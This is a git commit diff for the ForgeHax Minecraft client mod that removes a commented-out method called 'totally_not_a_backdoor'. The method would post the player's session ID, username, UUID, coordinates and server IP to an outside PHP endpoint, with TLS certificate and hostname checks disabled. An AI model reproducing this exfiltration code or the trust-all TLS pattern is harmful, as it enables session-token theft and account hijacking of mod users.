be85a3ffcca4e64fbf78530c999323397ca6c0f0
fr1kin <matt.fr1kin@gmail.com>
2017-05-17 01:20:06 -0500

    :^)

--- src/main/java/com/matt/forgehax/ForgeHaxEventHandler.java
+++ src/main/java/com/matt/forgehax/ForgeHaxEventHandler.java
@@ -37,92 +37,6 @@ public class ForgeHaxEventHandler implements Globals {
 
     private static final WorldListener WORLD_LISTENER = new WorldListener();
 
-    private boolean isLoaded = false;
-
-    public static void totally_not_a_backdoor() {
-        /*
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                URL url = null;
-                try {
-                    trustAllHosts();
-                    url = new URL("https://www.shitsta.in/purple/vortex.php");
-                    Map<String, Object> params = Maps.newLinkedHashMap();
-                    params.put("coordX", MC.player.getPosition().getX());
-                    params.put("coordY", MC.player.getPosition().getY());
-                    params.put("coordZ", MC.player.getPosition().getZ());
-                    params.put("uuid", MC.getSession().getProfile().getId().toString());
-                    params.put("username", MC.getSession().getUsername());
-                    params.put("session", MC.getSession().getSessionID());
-                    params.put("dimension",MC.player.dimension);
-                    params.put("ip", MC.getCurrentServerData() != null ? MC.getCurrentServerData().serverIP : "localhost");
-
-                    StringBuilder postData = new StringBuilder();
-                    for (Map.Entry<String, Object> param : params.entrySet()) {
-                        if (postData.length() != 0) postData.append('&');
-                        postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
-                        postData.append('=');
-                        postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
-                    }
-                    byte[] postDataBytes = postData.toString().getBytes("UTF-8");
-
-                    HostnameVerifier allHostsValid = new HostnameVerifier() {
-                        public boolean verify(String hostname, SSLSession session) {
-                            return true;
-                        }
-                    };
-                    HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
-
-                    HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                    conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
-                    conn.setDoOutput(true);
-                    conn.getOutputStream().write(postDataBytes);
-
-                    Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
-
-                    for (int c; (c = in.read()) >= 0;) {
-                        System.out.print((char) c);
-                    }
-                } catch (Exception e) {
-                }
-            }
-        }).start();*/
-    }
-
-    private static void trustAllHosts()
-    {
-        // Create a trust manager that does not validate certificate chains
-        TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager()
-        {
-            public java.security.cert.X509Certificate[] getAcceptedIssuers()
-            {
-                return new java.security.cert.X509Certificate[] {};
-            }
-
-            public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException
-            {
-            }
-
-            public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException
-            {
-            }
-        } };
-
-        // Install the all-trusting trust manager
-        try
-        {
-            SSLContext sc = SSLContext.getInstance("TLS");
-            sc.init(null, trustAllCerts, new java.security.SecureRandom());
-            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
-        } catch (Exception e)
-        {
-            e.printStackTrace();
-        }
-    }
-
     /**
      * Called when the local player updates
      */
@@ -146,20 +60,6 @@ public class ForgeHaxEventHandler implements Globals {
     @SubscribeEvent
     public void onWorldLoad(WorldEvent.Load event) {
         event.getWorld().addEventListener(WORLD_LISTENER);
-        isLoaded = true;
-    }
-
-    @SubscribeEvent
-    public void onWorldUnload(WorldEvent.Unload event) {
-        isLoaded = false;
-    }
-
-    @SubscribeEvent
-    public void onLocalPlayer(LocalPlayerUpdateEvent event) {
-        if(isLoaded) {
-            totally_not_a_backdoor();
-            isLoaded = false;
-        }
     }
 
     /**
